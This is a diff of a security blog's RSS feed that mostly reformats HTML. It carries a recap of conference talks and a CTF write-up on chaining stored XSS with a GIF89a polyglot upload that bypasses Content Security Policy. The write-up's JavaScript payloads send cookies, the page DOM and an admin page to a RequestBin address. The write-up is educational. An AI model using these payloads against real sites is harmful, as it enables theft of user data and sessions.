@@ -19,129 +19,93 @@
 	  <guid>/devalias/2017/11/19/presenting-all-the-things-bsides-wellington-csides-sectalks/</guid>
 	  <description><![CDATA[
 	     <p>Recently I had the opportunity to present at a few local security meetups, and one international security conference.</p>
-
 <p>At the start of 2017, I set a loose goal in the back of my mind that I would like to &quot;get out there more&quot; and &quot;speak about the things I do&quot;. Little did I know at the time that this would actually eventuate; leading to me having a pile of great experiences, and meeting some really cool and talented people!</p>
-
 <h2>TL;DR</h2>
-
 <ul>
 <li><a href="http://www.sectalks.org/canberra/">SecTalks Canberra</a> (<a href="https://www.meetup.com/SecTalks-Canberra/events/241579721/">November 14th, 2017; Canberra, Australia</a>)
-
 <ul>
 <li>&quot;Hack FaaSter: Leveraging Docker and OpenFaaS for fun and offensive (security) profit.&quot;</li>
 <li>Slides, workshop, etc: <a href="https://github.com/0xdevalias/hack-FaaSter">GitHub</a> <a href="https://github.com/0xdevalias/hack-FaaSter/blob/master/20171114%20-%20Hack%20FaaSter%20-%20SecTalks%20Canberra.pdf">PDF</a>, <a href="https://speakerdeck.com/0xdevalias/hack-faaster-leveraging-docker-and-openfaas-for-fun-and-offensive-security-profit">SpeakerDeck</a>, <a href="https://www.slideshare.net/GlenndevaliasGrant/hack-faaster-sectalks-canberra-20171114">SlideShare</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="http://www.bsidesau.com.au/csides.html">CSides Canberra</a> (November 17th, 2017; Canberra, Australia)
-
 <ul>
 <li>&quot;Gophers, whales and.. clouds? Oh my!&quot; <code>v0.2-prewlg-alpha</code></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="https://www.bsides.nz/">BSides Wellington 2017</a> (November 23-24th, 2017; Wellington, New Zealand)
-
 <ul>
-<li><a href="https://bsideswellington2017.sched.com/speaker/glenndevaliasgrant">Speaker: Glenn &#39;devalias&#39; Grant</a></li>
+<li><a href="https://bsideswellington2017.sched.com/speaker/glenndevaliasgrant">Speaker: Glenn 'devalias' Grant</a></li>
 <li><a href="https://bsideswellington2017.sched.com/event/CTpF/gophers-whales-and-clouds-oh-my">&quot;Gophers, whales and.. clouds? Oh my!&quot;</a></li>
 <li>Slides, etc: <a href="https://github.com/0xdevalias/gopherblazer">GitHub</a>, <a href="https://github.com/0xdevalias/gopherblazer/blob/master/slides/20171123-Gopherblazer-BSidesWellington.pdf">PDF</a>, <a href="https://speakerdeck.com/0xdevalias/gophers-whales-and-dot-clouds-oh-my">SpeakerDeck</a>, <a href="https://www.slideshare.net/GlenndevaliasGrant/gophers-whales-and-clouds-oh-my">SlideShare</a></li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
 <h2>SecTalks Canberra</h2>
-
-<p><a href="http://www.sectalks.org/canberra/">SecTalks Canberra</a> is a monthly security meetup with more of a focus on participation and learning from others, rather than the traditional &#39;super awesome technical talk but how do I do it&#39; style of things.</p>
-
+<p><a href="http://www.sectalks.org/canberra/">SecTalks Canberra</a> is a monthly security meetup with more of a focus on participation and learning from others, rather than the traditional 'super awesome technical talk but how do I do it' style of things.</p>
 <p>I had the opportunity to run a little workshop on how to use <a href="https://www.docker.com/">Docker</a> and <a href="https://www.openfaas.com/">OpenFaaS</a> to improve offensive capabilities.</p>
-
 <blockquote>
 <p>Hack FaaSter: Leveraging Docker and OpenFaaS for fun and offensive (security) profit.</p>
 </blockquote>
-
-<p>Slides, workshop files and more details are available from the &#39;TL;DR&#39; section above.</p>
-
+<p>Slides, workshop files and more details are available from the 'TL;DR' section above.</p>
 <p>Description:</p>
-
 <blockquote>
 <p>Join us this month for Hack FaaSter - leveraging <a href="https://www.docker.com/">Docker</a> and <a href="https://www.openfaas.com/">OpenFaaS</a> to improve offensive tooling, with the glorious <a href="https://twitter.com/_devalias">@_devalias</a> (<a href="https://github.com/0xdevalias">Github</a> // <a href="https://www.linkedin.com/in/glenn-devalias-grant/">LinkedIn</a>)</p>
 </blockquote>
-
 <h2>CSides Canberra</h2>
-
 <p><a href="http://www.bsidesau.com.au/csides.html">CSides Canberra</a> is a monthly security meetup run by the organisers of <a href="http://www.bsidesau.com.au/">BSides Canberra</a>.</p>
-
 <p>I had the opportunity to present a <code>v0.2-prewlg-alpha</code> version of my BSides Wellington talk, and get some practice and feedback in before the big thing.</p>
-
 <blockquote>
 <p>Gophers, whales and.. clouds? Oh my! (v0.2-prewlg-alpha)</p>
 </blockquote>
-
-<p>Slides and more details are available from the &#39;TL;DR&#39; section above, as well as the BSides Wellington section below.</p>
-
+<p>Slides and more details are available from the 'TL;DR' section above, as well as the BSides Wellington section below.</p>
 <h2>BSides Wellington</h2>
-
-<p><a href="https://www.bsides.nz/">BSides Wellington</a> (<a href="https://twitter.com/bsideswlg">Twitter</a>) is an annual security conference (based in Wellington, New Zealand) that ran it&#39;s first event in 2017. Popping up to fill the void left by <a href="https://www.kiwicon.org/">Kiwicon</a> (<a href="https://twitter.com/kiwicon">Twitter</a>), they had a strong first event, and hopefully will continue that trend into the future!</p>
-
+<p><a href="https://www.bsides.nz/">BSides Wellington</a> (<a href="https://twitter.com/bsideswlg">Twitter</a>) is an annual security conference (based in Wellington, New Zealand) that ran it's first event in 2017. Popping up to fill the void left by <a href="https://www.kiwicon.org/">Kiwicon</a> (<a href="https://twitter.com/kiwicon">Twitter</a>), they had a strong first event, and hopefully will continue that trend into the future!</p>
 <p>I had the opportunity to present my talk on leveraging DevOps trends and tools (<a href="https://www.docker.com/">Docker</a>, <a href="https://en.wikipedia.org/wiki/Serverless_computing">Serverless</a>, <a href="https://en.wikipedia.org/wiki/Function_as_a_service">FaaS</a>, <a href="https://golang.org/">Golang</a>, etc), to increase my efficiency and effectiveness on the offensive side.</p>
-
 <blockquote>
 <p>Gophers, whales and.. clouds? Oh my!</p>
 </blockquote>
-
-<p>Slides and more details are available from the &#39;TL;DR&#39; section above.</p>
-
+<p>Slides and more details are available from the 'TL;DR' section above.</p>
 <p>You can read the <a href="https://bsideswellington2017.sched.com/event/CTpF/gophers-whales-and-clouds-oh-my">official brief of my talk</a>:</p>
-
 <blockquote>
 <p>Go, Docker and Microservices; some great technologies and buzzwords that we hear so much about on the development side of the fence, but how can we leverage these technologies to improve our offensive capacity? Armed with a passion for new tech, a vague theory, and an ‘nsa-o-matic’ approved project name; gopherblazer was born.</p>
-
 <p>Whether through dockerising and improving existing tooling, leveraging Function-as-a-Service (FaaS) offerings, or just distributing offensive capabilities; I’ll share what I learned on my journey into improving my offensive capacity and productivity (while having an excuse to play with shiny technologies along the way!).</p>
 </blockquote>
-
 <p>And I can even now say that I have a <a href="https://bsideswellington2017.sched.com/speaker/glenndevaliasgrant">professional speaker bio</a>:</p>
-
 <blockquote>
 <p>Glenn ‘devalias’ Grant is a full-stack, polyglot developer with an acute interest in the offensive side of security. Whether building something new or finding the cracks to break in, there is always a solution to be found; even if it requires learning something entirely new. If you can improve/automate something, do it, and if you’ve put the effort in to do so, open-source it and share it with everyone else.</p>
-
 <p>When not hacking and coding, Glenn can be found snowboarding the peaks of Japan, falling out of the sky, floating around underwater, or just finding the most efficient path between A and B (even if that’s over walls). Life is short. Do the things you love, embrace the unknown, live your dreams, and share your passion.</p>
 </blockquote>
-
-<p>Overall, the conference was amazing. As expected, there were a number of deeply interesting technical talks, but as a bit of a twist from traditional security conferences, there were quite a few talks that focussed on mental health, impostor syndrome, and other &#39;culture based&#39; topics that so often go unmentioned in the infosec industry. Very much appreciated and would love to see this sort of thing happen at more conferences in future.</p>
-
-<p>If you missed the talks, or want to go back and re-watch them, videos should be posted online at some point (once the organisers recover from running the conference). A lot of the presenters also seem to be pushing their slides/content out online. Here&#39;s a selection of the few I&#39;ve stumbled across so far (in no particular order):</p>
-
+<p>Overall, the conference was amazing. As expected, there were a number of deeply interesting technical talks, but as a bit of a twist from traditional security conferences, there were quite a few talks that focussed on mental health, impostor syndrome, and other 'culture based' topics that so often go unmentioned in the infosec industry. Very much appreciated and would love to see this sort of thing happen at more conferences in future.</p>
+<p>If you missed the talks, or want to go back and re-watch them, videos should be posted online at some point (once the organisers recover from running the conference). A lot of the presenters also seem to be pushing their slides/content out online. Here's a selection of the few I've stumbled across so far (in no particular order):</p>
 <ul>
-<li><a href="https://github.com/0xdevalias/gopherblazer#talks">Glenn &#39;devalias&#39; Grant, &quot;Gophers, whales and.. clouds? Oh my!&quot;</a> (<a href="https://twitter.com/_devalias/status/937104594974289920">Twitter</a>)</li>
+<li><a href="https://github.com/0xdevalias/gopherblazer#talks">Glenn 'devalias' Grant, &quot;Gophers, whales and.. clouds? Oh my!&quot;</a> (<a href="https://twitter.com/_devalias/status/937104594974289920">Twitter</a>)</li>
 <li><a href="https://speakerdeck.com/barnbarn/layer-2-person-spoofing-and-impostor-syndrome">Ben Hughes, &quot;Layer 2 person spoofing and impostor syndrome&quot;</a> (<a href="https://twitter.com/benjammingh/status/933484211977166848">Twitter</a>)</li>
 <li><a href="https://speakerdeck.com/heisenburger/design-for-security-bsides-wellington-2017">Serena Chen, &quot;Design for Security — BSides Wellington 2017&quot;</a> (<a href="https://twitter.com/Sereeena/status/935208350207356930">Twitter</a>)</li>
 <li><a href="https://mango.pdf.zone/operation-luigi-how-i-hacked-my-friend-without-her-noticing">&quot;Alex&quot;, &quot;Operation Luigi: How I hacked my friend without her noticing&quot;</a> (<a href="https://twitter.com/mangopdf/status/934897549554491394">Twitter</a>)</li>
 <li><a href="https://github.com/jenofdoom/give-your-users-better-feedback-about-rubbish-passwords">@jenofdoom, &quot;Give your users better feedback about rubbish passwords with zxcvbn&quot;</a></li>
-<li><a href="https://zxsecurity.co.nz/presentations/201711_BSidesWLG-ZXSecurity_MeatPuppets.pdf">Simon &#39;bogan&#39; Howard, &quot;Influencing Meat
-Puppets Through
+<li><a href="https://zxsecurity.co.nz/presentations/201711_BSidesWLG-ZXSecurity_MeatPuppets.pdf">Simon 'bogan' Howard, &quot;Influencing Meat<br />
+Puppets Through<br />
 Memes&quot;</a> (<a href="https://twitter.com/bogan/status/934896629135556608">Twitter</a>)</li>
 </ul>
-
 <p>It looks like there are also some good summaries, notes and writeups of the conference popping up around the net. Some places to start looking:</p>
-
 <ul>
 <li><a href="https://rodger.donaldson.gen.nz/archives/2017/11/b-sides-wellington-day-1/">B-Sides Wellington - Day 1 (Notes)</a> (<a href="https://twitter.com/hroethgar/status/933620066129625090">Twitter</a>)
-
 <ul>
 <li>My Talk: <a href="https://rodger.donaldson.gen.nz/archives/2017/11/b-sides-wellington-day-1/#gophers-whales-and-clouds-oh-my">Gophers, whales, and clouds? Oh my.</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="https://rodger.donaldson.gen.nz/archives/2017/11/b-sides-wellington-day-2/">B-Sides Wellington - Day 2 (Notes)</a></li>
 <li><a href="https://www.asinine.nz/2017-11-25/bsides-badge-part1/">BSides Wellington Badge Challenge</a> (<a href="https://twitter.com/asinine_net_nz/status/934592555253039104">Twitter</a>)</li>
 </ul>
-
 <p>And of course, Twitter is always full of content when it comes to the security industry, with 3 hashtags mainly being used throughout the conference:</p>
-
 <ul>
-<li><a href="https://twitter.com/search?q=%23bsideswlg&src=typd">#bsideswlg</a></li>
-<li><a href="https://twitter.com/search?q=%23bsideswlg2017&src=typd">#bsideswlg2017</a></li>
-<li><a href="https://twitter.com/search?q=%23bsidesnz&src=typd">#bsidesnz</a></li>
+<li><a href="https://twitter.com/search?q=%23bsideswlg&amp;src=typd">#bsideswlg</a></li>
+<li><a href="https://twitter.com/search?q=%23bsideswlg2017&amp;src=typd">#bsideswlg2017</a></li>
+<li><a href="https://twitter.com/search?q=%23bsidesnz&amp;src=typd">#bsidesnz</a></li>
 </ul>
-
 <h2>Conclusion</h2>
-
 <p>While at times I was definitely feeling the stress and pressure of having a few looming deadlines, and at times possibly not allocating enough time/energy/focus to working on them as I would have liked, it has been a great experience, and left a smouldering flame of passion to speak at more events in the future.</p>
-
 <p>Know of any other writeups, slides or tools; or got a cool story to share from BSides Wellington? Would love to hear from you in the comments!</p>
 
 	  ]]></description>
@@ -154,170 +118,150 @@ Memes&quot;</a> (<a href="https://twitter.com/bogan/status/934896629135556608">T
 	  <pubDate>2016-09-16T00:00:00+10:00</pubDate>
 	  <guid>/devalias/2016/09/16/ctf-snippets-xss-gif/</guid>
 	  <description><![CDATA[
-	     <p>I was playing around with the top challenge on the CTF at <a href="http://www.sectalks.org/canberra/">SecTalks</a> the other night, and thought I&#39;d do a quick writeup of some of the techniques required; for future reference, and to help others to learn.</p>
-
+	     <p>I was playing around with the top challenge on the CTF at <a href="http://www.sectalks.org/canberra/">SecTalks</a> the other night, and thought I'd do a quick writeup of some of the techniques required; for future reference, and to help others to learn.</p>
 <h2>Hack the gibso.. Website</h2>
-
 <p>To start off, we were given a URL to a website that looked like a pretty standard sort of blog. Features included things like account registration/login, avatar upload, messaging between users, search, posts (not by a standard account), comments on posts (standard account), showing online users, etc. And the <code>administrator</code> was online.. interesting.</p>
-
-<p>Poking around at things, I discovered that the messaging system didn&#39;t seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:</p>
-<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">'XSS'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
-</code></pre></div>
-<p>I checked the message.. but for some reason it didn&#39;t pop, even though my payload seemed fine in the source. :(</p>
-<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"well"</span><span class="nt">&gt;</span>
-  <span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">'XSS'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/div&gt;</span>
-</code></pre></div>
+<p>Poking around at things, I discovered that the messaging system didn't seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:</p>
+<pre lang="html"><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
+</code></pre>
+<p>I checked the message.. but for some reason it didn't pop, even though my payload seemed fine in the source. :(</p>
+<pre lang="html"><code>&lt;div class=&quot;well&quot;&gt;
+  &lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;/div&gt;
+</code></pre>
 <p>Looking at the developer console gave me some more insight. Apparently this site had <a href="https://en.wikipedia.org/wiki/Content_Security_Policy">Content Security Policy</a> enabled, and it was blocking my payload.</p>
-
 <blockquote>
-<p>Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src &#39;self&#39;&quot;. Either the &#39;unsafe-inline&#39; keyword, a hash (&#39;sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M=&#39;), or a nonce (&#39;nonce-...&#39;) is required to enable inline execution.</p>
+<p>Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src 'self'&quot;. Either the 'unsafe-inline' keyword, a hash ('sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M='), or a nonce ('nonce-...') is required to enable inline execution.</p>
 </blockquote>
-
 <p>Probably should have noticed those headers earlier.. Oh well, now to find a way around them. With spacing added for readability, the headers looked like:</p>
-<div class="highlight"><pre><code class="language-" data-lang="">Content-Security-Policy:
+<pre><code>Content-Security-Policy:
   default-src 'none';
   img-src 'self' placehold.it *.imgix.net;
   script-src 'self';
   connect-src 'self';
   style-src 'self' fonts.gstatic.com fonts.googleapis.com;
   font-src 'self' fonts.googleapis.com fonts.gstatic.com;
-</code></pre></div>
+</code></pre>
 <p>Since compromising Google or any other websites just to beat this CTF seemed out of the question, I figured I needed a way to get my script payload uploaded so that it would run from <code>self</code>.</p>
-
 <p>How about that avatar upload functionality? Well, as you might expect, it was restricted to uploading images. But surely we could find a way around that.. right? Seems so! By making use of a super simple image format, we could trick the image checker and upload our payload.</p>
-
-<p>Using the <code>GIF89a</code> format (which conveniently starts with it&#39;s name, then the rest is the GIF payload) I constructed and uploaded my new &#39;avatar&#39; <code>pwn.gif</code>, designed to steal cookies via <a href="http://requestb.in/">RequestBin</a>:</p>
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
-<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">'http://requestb.in/secretcode?c='</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
-</code></pre></div>
-<p>This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new &#39;avatar&#39; by sending myself a test message:</p>
-<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://example.com/uploads/filenamehash.gif"</span><span class="nt">&gt;&lt;/script&gt;</span>
-</code></pre></div>
+<p>Using the <code>GIF89a</code> format (which conveniently starts with it's name, then the rest is the GIF payload) I constructed and uploaded my new 'avatar' <code>pwn.gif</code>, designed to steal cookies via <a href="http://requestb.in/">RequestBin</a>:</p>
+<pre lang="javascript"><code>GIF89a/*.......*/=0;
+window.location='http://requestb.in/secretcode?c='+document.cookie;
+</code></pre>
+<p>This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new 'avatar' by sending myself a test message:</p>
+<pre lang="html"><code>&lt;script src=&quot;http://example.com/uploads/filenamehash.gif&quot;&gt;&lt;/script&gt;
+</code></pre>
 <p>Loading the new message.. there was still no payload! :( It seems Chrome foiled my plans again:</p>
-
 <blockquote>
-<p>Refused to execute script from &#39;<a href="http://example.com/uploads/filenamehash.gif">http://example.com/uploads/filenamehash.gif</a>&#39; because its MIME type (&#39;image/gif&#39;) is not executable.</p>
+<p>Refused to execute script from '<a href="http://example.com/uploads/filenamehash.gif">http://example.com/uploads/filenamehash.gif</a>' because its MIME type ('image/gif') is not executable.</p>
 </blockquote>
-
 <p>This seemed like a browser specific security feature though, so trying it out in Safari, my payload executed. Good work Apple security! Checking the captured results on RequestBin there were no cookies. Guess I probably should have looked at that <code>HttpOnly</code> flag first.. Sometimes I just get caught up in the heat of the moment.</p>
-
-<p>Ok.. so we couldn&#39;t steal the cookies.. but what could we do? <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-Site Request Forgery (CSRF)</a> maybe? There was a CSRF token designed to prevent this, but it didn&#39;t seem to get validated. That&#39;s good.. but what should we target?</p>
-
+<p>Ok.. so we couldn't steal the cookies.. but what could we do? <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-Site Request Forgery (CSRF)</a> maybe? There was a CSRF token designed to prevent this, but it didn't seem to get validated. That's good.. but what should we target?</p>
 <p>Needing some better visibility on the situation, I decided to just steal the whole <a href="https://en.wikipedia.org/wiki/Document_Object_Model">DOM</a> and have a look around. Maybe the administrator had other cool things to look at? Hacker-eyes activate! (comments added for clarity):</p>
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
-<span class="cm">/* Wait for the page to fully load */</span>
-<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-  <span class="cm">/* Create a form to send to RequestBin */</span>
-  <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'form'</span><span class="p">);</span>
-  <span class="nx">f</span><span class="p">.</span><span class="nx">id</span><span class="o">=</span><span class="s2">"haxForm"</span><span class="p">;</span>
-  <span class="nx">f</span><span class="p">.</span><span class="nx">method</span><span class="o">=</span><span class="s2">"post"</span><span class="p">;</span>
-  <span class="nx">f</span><span class="p">.</span><span class="nx">action</span><span class="o">=</span><span class="s2">"http://requestb.in/secretcode"</span><span class="p">;</span>
+<pre lang="javascript"><code>GIF89a/*.......*/=0;
+/* Wait for the page to fully load */
+window.onload = function() {
+  /* Create a form to send to RequestBin */
+  var f = document.createElement('form');
+  f.id=&quot;haxForm&quot;;
+  f.method=&quot;post&quot;;
+  f.action=&quot;http://requestb.in/secretcode&quot;;
 
-  <span class="cm">/* Create a textarea to store our data */</span>
-  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'textarea'</span><span class="p">);</span>
-  <span class="nx">t</span><span class="p">.</span><span class="nx">name</span><span class="o">=</span><span class="s2">"haxPayload"</span><span class="p">;</span>
+  /* Create a textarea to store our data */
+  var t = document.createElement('textarea');
+  t.name=&quot;haxPayload&quot;;
 
-  <span class="cm">/* Capture the entire DOM and Base64 encode it */</span>
-  <span class="nx">t</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">outerHTML</span><span class="p">)</span>
+  /* Capture the entire DOM and Base64 encode it */
+  t.value = btoa(document.documentElement.outerHTML)
 
-  <span class="cm">/* Inject the form and send it */</span>
-  <span class="nx">f</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
-  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
-  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"haxForm"</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
-<span class="p">};</span>
-</code></pre></div>
+  /* Inject the form and send it */
+  f.appendChild(t);
+  document.body.appendChild(f);
+  document.getElementById(&quot;haxForm&quot;).submit();
+};
+</code></pre>
 <p>Ignoring my rusty JavsScript, the new payload would create a HTML <code>form</code> element with a <code>textarea</code>, grab the entire contents of the DOM, <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/btoa">Base64 encode</a> them, stick them in the <code>textarea</code>, inject the <code>form</code> into the page, then send that off to RequestBin.</p>
-
 <p>After checking that this actually worked against my own account, I sent a message to the administrator and waited. After a minute or so, the message status changed to read. Heading over to RequestBin and decoding the captured DOM, I found the following snippet:</p>
-<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"admin.php"</span><span class="nt">&gt;</span>Administration<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
-</code></pre></div>
-<p>Sweet, let&#39;s find something juicy on that page! Reworking the payload (with a little help from <a href="https://api.jquery.com/jquery.get/">JQuery</a> that was already on the site):</p>
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
-<span class="cm">/* Wait for the page to fully load */</span>
-<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-  <span class="cm">/* Create a form to send to RequestBin */</span>
-  <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'form'</span><span class="p">);</span>
-  <span class="nx">f</span><span class="p">.</span><span class="nx">id</span><span class="o">=</span><span class="s2">"haxForm"</span><span class="p">;</span>
-  <span class="nx">f</span><span class="p">.</span><span class="nx">method</span><span class="o">=</span><span class="s2">"post"</span><span class="p">;</span>
-  <span class="nx">f</span><span class="p">.</span><span class="nx">action</span><span class="o">=</span><span class="s2">"http://requestb.in/secretcode"</span><span class="p">;</span>
+<pre lang="html"><code>&lt;li&gt;&lt;a href=&quot;admin.php&quot;&gt;Administration&lt;/a&gt;&lt;/li&gt;
+</code></pre>
+<p>Sweet, let's find something juicy on that page! Reworking the payload (with a little help from <a href="https://api.jquery.com/jquery.get/">JQuery</a> that was already on the site):</p>
+<pre lang="javascript"><code>GIF89a/*.......*/=0;
+/* Wait for the page to fully load */
+window.onload = function() {
+  /* Create a form to send to RequestBin */
+  var f = document.createElement('form');
+  f.id=&quot;haxForm&quot;;
+  f.method=&quot;post&quot;;
+  f.action=&quot;http://requestb.in/secretcode&quot;;
 
-  <span class="cm">/* Create a textarea to store our data */</span>
-  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'textarea'</span><span class="p">);</span>
-  <span class="nx">t</span><span class="p">.</span><span class="nx">name</span><span class="o">=</span><span class="s2">"haxPayload"</span><span class="p">;</span>
+  /* Create a textarea to store our data */
+  var t = document.createElement('textarea');
+  t.name=&quot;haxPayload&quot;;
 
-  <span class="cm">/* Inject the form */</span>
-  <span class="nx">f</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
-  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
+  /* Inject the form */
+  f.appendChild(t);
+  document.body.appendChild(f);
 
-  <span class="cm">/* Load the admin page ajax-style, Base64 encode it, send it off */</span>
-  <span class="nx">$</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="s2">"admin.php"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nx">t</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
-    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"haxForm"</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
-  <span class="p">});</span>
-<span class="p">};</span>
-</code></pre></div>
-<p>Using the last payload as the template, I updated it to load the <code>admin.php</code> page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn&#39;t even a need to do anything else:</p>
-<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;legend&gt;</span>
-  <span class="nt">&lt;h3&gt;</span>Administration<span class="nt">&lt;/h3&gt;</span>
-<span class="nt">&lt;/legend&gt;</span>
-<span class="nt">&lt;h4&gt;</span>flag{the-secret-flag-code}<span class="nt">&lt;/h4&gt;</span>
-</code></pre></div>
+  /* Load the admin page ajax-style, Base64 encode it, send it off */
+  $.get(&quot;admin.php&quot;, function(data) {
+    t.value = btoa(data);
+    document.getElementById(&quot;haxForm&quot;).submit();
+  });
+};
+</code></pre>
+<p>Using the last payload as the template, I updated it to load the <code>admin.php</code> page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn't even a need to do anything else:</p>
+<pre lang="html"><code>&lt;legend&gt;
+  &lt;h3&gt;Administration&lt;/h3&gt;
+&lt;/legend&gt;
+&lt;h4&gt;flag{the-secret-flag-code}&lt;/h4&gt;
+</code></pre>
 <p>Mischief managed!</p>
-
 <h2>Raw Notes</h2>
-
 <p>I figured it might be fun to include the raw snippets of notes I made as I was going through this, to give a better idea of my thought process throughout:</p>
-
 <ul>
 <li>Administrator is online</li>
 <li>We can send messages to users</li>
 <li>We can inject images/etc in messages, but ContentSecurityPolicy blocks us from executing code from anywhere but self</li>
 <li>We can upload image files (can we make that other types?)
-
 <ul>
-<li>GIF89a based XSS, won&#39;t exec in chrome though..</li>
-</ul></li>
-<li>Administrator will read messages we send them (check the &#39;sent&#39; page)</li>
-<li>Admin isn&#39;t using chrome! :p</li>
-<li>The request doesn&#39;t send us any cookies! :( (they&#39;re HTTP only)</li>
-<li>CSRF token doesn&#39;t seem to actually be validated.. What can we CSRF..?</li>
-<li>Use the XSS to send us the admin&#39;s DOM</li>
-<li>Seems there&#39;s an admin.php page..</li>
+<li>GIF89a based XSS, won't exec in chrome though..</li>
+</ul>
+</li>
+<li>Administrator will read messages we send them (check the 'sent' page)</li>
+<li>Admin isn't using chrome! :p</li>
+<li>The request doesn't send us any cookies! :( (they're HTTP only)</li>
+<li>CSRF token doesn't seem to actually be validated.. What can we CSRF..?</li>
+<li>Use the XSS to send us the admin's DOM</li>
+<li>Seems there's an admin.php page..</li>
 <li>Ajax the admin page</li>
 <li>Success!</li>
 </ul>
-
 <h2>Conclusion</h2>
-
 <p>This CTF was a pretty fun little challenge, tying together XSS, CSP bypass, file upload/image abuse and snooping through the DOM.</p>
-
-<p>Has this helped you learn something new? Got a better way to approach it? I&#39;d love to hear from you in the comments!</p>
-
+<p>Has this helped you learn something new? Got a better way to approach it? I'd love to hear from you in the comments!</p>
 <h2>References</h2>
-
 <ul>
 <li>Content Security Policy
-
 <ul>
 <li><a href="https://www.owasp.org/index.php/Content_Security_Policy">Content Security Policy | OWASP</a></li>
 <li><a href="https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet">Content Security Policy Cheat Sheet | OWASP</a></li>
 <li><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/">&quot;An Introduction to Content Security Policy&quot; by HTML5 Rocks</a></li>
 <li><a href="https://content-security-policy.com/">Content Security Policy References and Examples</a></li>
-</ul></li>
+</ul>
+</li>
 <li>File Upload/Image XSS
-
 <ul>
